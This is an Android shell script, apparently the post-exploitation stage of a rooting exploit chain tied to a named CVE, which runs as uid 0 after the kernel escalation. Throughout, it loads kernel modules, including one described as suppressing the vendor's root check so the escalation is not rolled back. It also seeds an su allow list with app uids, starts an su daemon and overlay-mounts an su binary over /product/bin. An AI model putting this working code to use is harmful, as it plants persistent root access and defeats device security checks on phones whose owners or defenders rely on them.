#!/system/bin/sh
# PostLockBoot restore carrier: forked by the exploit chain via KS_COLDSTART
# (root.c:1545) as uid0 kernel domain after self-patch setuid(0) AND
# finitmod kernelsu.ko both succeed.  Ported from the host-side
# tools/postlock.sh heredoc (CVE-2026-43499 repo); the payload source dir
# is this app's private assets extraction dir (app_data_file label,
# readable by the kernel-domain carrier).
#
# NOTE: no single quotes below (this file is also safe to eval).
PS=/data/user/0/org.postlock.boot/files/postlock
TMP=/data/local/temp
APP=com.resukisu.resukisu
ACT=org.bakasu.bakasu.ui.MainActivity

exec >> /data/local/tmp/postlock_restore.log 2>&1
echo "== restore start $(date) pid=$$ uid=$(id -u)"
id
ls -ld /data /data/local /data/local/temp 2>&1 || true
getenforce 2>/dev/null || true
set -e
mkdir -p $TMP
chcon u:object_r:shell_data_file:s0 $TMP
chmod 777 $TMP
echo 262144 > /proc/sys/fs/pipe-user-pages-soft
# rm-before-cp: a rerun copies over binaries the previous run left running
# (su daemon executes $TMP/su) -> cp hits ETXTBSY and set -e aborts
# mid-script. unlink-then-copy is always safe.
for f in kernelsu.ko finitmod ocsk.ko su preload.so; do
  rm -f $TMP/$f
  cp $PS/$f $TMP/$f
done
chmod 755 $TMP/kernelsu.ko $TMP/finitmod $TMP/ocsk.ko $TMP/su $TMP/preload.so
if grep -q ^kernelsu /proc/modules; then echo driver-already-loaded; else $TMP/finitmod $TMP/kernelsu.ko 0 || echo WARN-finitmod-failed; fi
# ocsk (v12): kill-path fuse + popup suppression (rep probes).  Must be
# loaded BEFORE the app restarts below -- libksud.so setuid(0) trips
# OPLUS_ROOT_CHECK and the escalation gets rolled back without it.
if grep -q ^ocsk /proc/modules; then echo ocsk-already-loaded; else $TMP/finitmod $TMP/ocsk.ko 0 arm=1 || echo WARN-ocsk-finitmod-failed; fi
# register the manager appid so zygote setresuid installs the
# [ksu_driver] fd for the manager (CONFIG_KSU_DEBUG param; must precede
# the app start).  Resolve the uid dynamically -- reinstall can renumber.
MUID=$(dumpsys package $APP 2>/dev/null | grep -oE 'userId=[0-9]+' | head -n1 | cut -d= -f2)
[ -n "$MUID" ] || MUID=10279
if [ -w /sys/module/kernelsu/parameters/ksu_debug_manager_appid ]; then
  echo $MUID > /sys/module/kernelsu/parameters/ksu_debug_manager_appid
  echo "manager_appid=$MUID"
fi
[ -f $TMP/su.allow ] || { echo 10282 > $TMP/su.allow; echo 10283 >> $TMP/su.allow; echo 2000 >> $TMP/su.allow; }
chmod 666 $TMP/su.allow
for p in $(ps -A -o PID=,ARGS= | grep "su --daemon" | grep -v grep | sed "s/ .*//"); do kill -9 $p 2>/dev/null || true; done
rm -f $TMP/su.sock $TMP/su.pid
setsid $TMP/su --daemon >> $TMP/su.log 2>&1 < /dev/null &
sleep 1
if [ ! -x /product/bin/su ]; then
  mkdir -p $TMP/ovl/lower $TMP/ovl/tmp
  mountpoint -q $TMP/ovl/lower || mount --bind /product/bin $TMP/ovl/lower
  mountpoint -q $TMP/ovl/tmp || mount -t tmpfs -o size=16m tmpfs $TMP/ovl/tmp
  mkdir -p $TMP/ovl/tmp/upper $TMP/ovl/tmp/work
  rm -f $TMP/ovl/tmp/upper/su
  cp $TMP/su $TMP/ovl/tmp/upper/su
  chmod 755 $TMP/ovl/tmp/upper/su
  mount -t overlay overlay -o lowerdir=$TMP/ovl/lower,upperdir=$TMP/ovl/tmp/upper,workdir=$TMP/ovl/tmp/work,context=u:object_r:system_file:s0 /product/bin
fi
# verify (shell identity; uid0 is not in su.allow seeds)
sleep 1
/product/bin/su -c id 2>&1 | head -1 || true
lsmod 2>/dev/null | grep -E "kernelsu|ocsk" || true
ps -A -o PID,ARGS 2>/dev/null | grep -m1 "su --daemon" || true
echo "wrap=$(getprop wrap.$APP)"
am force-stop $APP || true
sleep 1
am start -n $APP/$ACT > /dev/null 2>&1 || true
echo POSTLOCK-RESTORE-OK
